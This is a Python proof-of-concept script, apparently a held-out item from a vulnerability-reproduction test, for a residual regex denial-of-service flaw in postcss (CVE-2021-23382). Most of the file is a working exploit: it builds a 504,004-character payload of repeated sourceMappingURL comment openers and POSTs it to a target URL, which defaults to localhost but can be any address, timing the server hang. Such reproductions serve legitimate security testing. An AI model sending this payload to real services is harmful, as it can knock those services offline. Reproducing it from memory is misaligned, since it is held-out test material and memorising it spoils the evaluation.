#!/usr/bin/env python3
"""[HELD-OUT] bypass_poc — CVE-2021-23382 residual exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2021-23382 catastrophic-backtracking CSS to the REAL Express service (POST /process)
and measures the server-side response latency. postcss@8.2.10 (the CVE-2021-23368 fix, TARGET)
removed the `\\s*` sub-pattern but LEFT the greedy `.*` in the loadAnnotation regex
`/\\/\\*\\s*# sourceMappingURL=.*\\*\\//gm`. A payload of many repeated `/*# sourceMappingURL=`
prefixes with NO closing `*/` makes the greedy `.*` scan to EOL and backtrack at every `/*` start
position under the global scan -> super-linear blow-up -- the CVE-2021-23368 fix is INCOMPLETE.

Expected: SLOW (response hangs -> HTTP timeout) on V1 (8.2.10); FAST/bounded on V2 (8.2.13), where
CVE-2021-23382's fix replaces `.*` with the tempered-greedy `(?:(?!sourceMappingURL=).)*`, which
cannot backtrack across the repeated `sourceMappingURL=` prefixes.

Usage: bypass_poc.py http://127.0.0.1:28210
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = "a{}" + "/*# sourceMappingURL=" * 24000 + "!"   # len 504004
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = json.dumps({"css": PAYLOAD})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/process", body=body,
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28210"
    out = run(base)
    print(json.dumps({"poc": "residual/CVE-2021-23382", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
